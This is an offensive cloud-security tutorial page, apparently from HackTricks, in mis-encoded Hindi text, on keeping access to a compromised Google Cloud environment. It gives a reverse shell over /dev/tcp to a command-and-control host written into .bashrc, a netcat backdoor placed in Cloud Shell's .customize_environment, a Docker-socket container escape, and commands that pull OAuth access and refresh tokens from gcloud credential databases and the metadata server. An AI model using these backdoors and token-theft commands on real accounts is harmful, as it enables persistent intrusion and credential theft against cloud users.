# GCP - Non-svc Persistance

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

рдпреЗ рддрдХрдиреАрдХреЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИрдВ рдПрдХ рдмрд╛рд░, рдХрд┐рд╕реА рддрд░рд╣, рдЖрдкрдиреЗ GCP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ GCP рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд▓ рд░рд╣реА рдХрд┐рд╕реА рдорд╢реАрди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рд╣реИред

## GoogleтАЩs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### рд╕реНрдерд╛рдпреА рдмреИрдХрдбреЛрд░

[**Google Cloud Shell**](https://cloud.google.com/shell/) рдЖрдкрдХреЛ рдЖрдкрдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рд╕реАрдзреЗ рдЖрдкрдХреЗ рдХреНрд▓рд╛рдЙрдб рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рдПрдХреНрд╕реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рд╕рдВрдмрджреНрдз рд▓рд╛рдЧрдд рдХреЗред

рдЖрдк **рд╡реЗрдм рдХрдВрд╕реЛрд▓** рд╕реЗ рдпрд╛ **`gcloud cloud-shell ssh`** рдЪрд▓рд╛рдХрд░ Google's Cloud Shell рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдХрдВрд╕реЛрд▓ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд╖рдорддрд╛рдПрдВ рд╣реИрдВ:

1. **Google Cloud рддрдХ рдкрд╣реБрдБрдЪ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА Google рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рдкрд╛рд╕ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд Cloud Shell рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрддреА рд╣реИред
2. рдЙрдХреНрдд рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЕрдЧрд░ рдХреЛрдИ рдЧрддрд┐рд╡рд┐рдзрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рддреЛ рдХрдо рд╕реЗ рдХрдо 120 рджрд┐рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛ред
3. рдЙрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдЧрдарди рдХреА **рдХреЛрдИ рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИ**ред

рдЗрд╕рдХрд╛ рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдПрдХ рдмреИрдХрдбреЛрд░ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рд░ 120 рджрд┐рдиреЛрдВ рдореЗрдВ рдХрдо рд╕реЗ рдХрдо GC Shell рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ, рдмреИрдХрдбреЛрд░ рдЬреАрд╡рд┐рдд рд░рд╣реЗрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╢реЗрд▓ рдорд┐рд▓реЗрдЧрд╛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдпрд╣ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдмрд╕ рдпрд╣ рдХрд░рдХреЗ:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
рдПрдХ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **`.customize_environment`** рд╣реИ, рдЬреЛ рдЕрдЧрд░ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╡рд╣ **рд╣рд░ рдмрд╛рд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдПрдЧреА** рдЬрдм рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **cloud shell** рддрдХ рдкрд╣реБрдБрдЪрддрд╛ рд╣реИ (рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдХреА рддрд░рд╣)ред рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "рдЕрдХреНрд╕рд░" cloud shell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдкрд░реНрд╕рд┐рд╕реНрдЯреЗрдВрд╕ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рдмреИрдХрдбреЛрд░ рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ рдПрдХ рдХреЛ рдбрд╛рд▓реЗрдВ:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Cloud Shell рдореЗрдВ рдкрд╣рд▓реА рдмрд╛рд░ рдХреЛрдИ рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛рддреА рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╡рд┐рдВрдбреЛ **рдкреЙрдк рдЕрдк** рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреЙрдк-рдЕрдк рдЖрддрд╛ рд╣реИ, рддреЛ рд▓рдХреНрд╖реНрдп рд╕рдВрджрд┐рдЧреНрдз рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕реНрдерд╛рдпрд┐рддреНрд╡ рд╡рд┐рдзрд┐ рдХреЛ рдирд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### Google Cloud Shell Container Escape

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Google Cloud Shell рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЖрдк **рдореЗрдЬрдмрд╛рди рдкрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рднрд╛рдЧ рд╕рдХрддреЗ рд╣реИрдВ** рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд░рдХреЗ:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
рдпрд╣ Google рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдкрдХреЛ рдЙрд╕ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдХреНрдпрд╛ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдЗрд╕рдХреА рд╡реНрдпрд╛рдкрдХ рджреГрд╖реНрдЯрд┐ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣реЛрд╕реНрдЯ рд╕реЗ рдЖрдк рдПрдХ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдЯреЛрдХрди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреЛрдкреНрд╕ рдХреЗ рд╕рд╛рде:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## рдЯреЛрдХрди рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

### рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

рдпрджрд┐ рдЖрдк **GCP рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд╣реЛрдо рдлреЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ**, рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВрдЧреЗ рдЬрдм рддрдХ рдЖрдк рдЪрд╛рд╣реЗрдВ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реБрдП рдФрд░ рдЙрд╕ рдорд╢реАрди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд┐рдП рдмрд┐рдирд╛ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЙрд╕рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдЧрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗ MFA рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рд╣реЛред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд┐рддрдиреА рджреЗрд░ рдЪрд╛рд╣реЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдирдП рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд░реНрддрдорд╛рди рдЯреЛрдХрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
рдПрдХ рдирдпрд╛ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдЬрдирд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд▓рд╛рдПрдВ:
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

рдирдпрд╛ рддрд╛рдЬрд╝рд╛ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди, рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА, рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд╕рд╛рде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдПрдВ:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

### рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯреНрд╕

рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде, рдпрджрд┐ рдЖрдк **рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреА рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдлрд╛рдЗрд▓ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЖрдорддреМрд░ рдкрд░ **рдЬрд┐рддрдирд╛ рдЪрд╛рд╣реЗрдВ рдЙрддрдиреА рджреЗрд░ рддрдХ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЖрдк рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ **OAuth рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрддреЗ рд╣реИрдВ** рддреЛ рдпрд╣ рдФрд░ рднреА рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐, рдпрджреНрдпрдкрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпреЗ рдЯреЛрдХрди рдХреЗрд╡рд▓ рдПрдХ рдШрдВрдЯреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддреЗ рд╣реИрдВ, рдЕрдЧрд░ **рдкреАрдбрд╝рд┐рдд рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдПрдкреАрдЖрдИ рдХреА рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ, рддреЛ OAuh рдЯреЛрдХрди рддрдм рддрдХ рдорд╛рдиреНрдп рд░рд╣реЗрдЧрд╛ рдЬрдм рддрдХ рдпрд╣ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛**ред

### рдореЗрдЯрд╛рдбреЗрдЯрд╛

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдЬрдм рддрдХ рдЖрдк GCP рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд▓ рд░рд╣реА рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рдЖрдк **рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдХреЗ рдЙрд╕ рдорд╢реАрди рд╕реЗ рдЬреБрдбрд╝реЗ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ** (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдореЗрдВ рдЖрдк рдЬреЛ OAuth рдЯреЛрдХрди рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ рдЖрдорддреМрд░ рдкрд░ рд╕реНрдХреЛрдкреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ)ред

### рдЙрдкрдЪрд╛рд░

рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЙрдкрдЪрд╛рд░ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2) рдореЗрдВ рд╕рдордЭрд╛рдП рдЧрдП рд╣реИрдВред

## рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

рдЬрдм [рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХрдВрдкреНрдпреВрдЯрд┐рдВрдЧ рдЗрдВрд╕реНрдЯреЗрдВрд╕ (VM) рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрдиреНрди OAuth рдЯреЛрдХрди рдореЗрдВ [**рд╕реНрдХреЛрдк**](https://oauth.net/2/scope/) **рд╕реАрдорд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧреА**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЕрдХрд╛рдЙрдВрдЯ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдЗрд╕ рд╕реАрдорд╛ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛** рдпрд╛ рддреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рд╣реЛрд╕реНрдЯ рдореЗрдВ **рдирдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЦреЛрдЬрдирд╛** рд╣реИ, **рд╕рд░реНрд╡рд┐рд╕ рдХреА рдЦреЛрдЬрдирд╛ рдЬрд┐рд╕рд╕реЗ рдмрд┐рдирд╛ рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ OAuth рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ** рдпрд╛ **рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдЕрд▓рдЧ VM рдкрд░ рдЬрд╛рдирд╛** рд╣реИред

**рдПрдХ рдФрд░ рдмреЙрдХреНрд╕ рдкреЙрдк рдХрд░реЗрдВ**

рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреЛрдИ рдЕрдиреНрдп рдмреЙрдХреНрд╕ рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕ рдХреЗ рд╕рд╛рде рдореМрдЬреВрдж рд╣реЛред рдпрджрд┐ рдЖрдк `gcloud compute instances list --quiet --format=json` рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрди рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬрд┐рдирдореЗрдВ рдпрд╛ рддреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЪрд╛рд╣рд╛ рдЧрдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реНрдХреЛрдк рд╣реЛ рдпрд╛ **`auth/cloud-platform`** рд╕рднреА-рд╕рдорд╛рд╡реЗрд╢реА рд╕реНрдХреЛрдк рд╣реЛред

рд╕рд╛рде рд╣реА, рдЙрди рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдкрд░ рдирдЬрд░ рд░рдЦреЗрдВ рдЬрд┐рдирдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`)ред

**рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреАрдЬрд╝ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ**

Google рдмрд╣реБрдд рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХрд╣рддрд╛ рд╣реИ [**"рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕ рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рдирд╣реАрдВ рд╣реИрдВтАж рдЬрдм OAuth рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХрд░рддреЗ рд╕рдордп рдЗрдирдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд [**рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреА**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys) рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╕реАрдорд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ **RSA рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреАрдЬрд╝** рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ Google Cloud API рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдФрд░ **рдХреЛрдИ рд╕реНрдХреЛрдк рд╕реАрдорд╛рдУрдВ рдХреЗ рдмрд┐рдирд╛ рдирдпрд╛ OAuth рдЯреЛрдХрди рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХрд┐рд╕реА рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдиреЗ рдХрд┐рд╕реА рд╕рдордп рдХреА рдирд┐рд░реНрдпрд╛рдд рдХреА рд╣реИ:
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
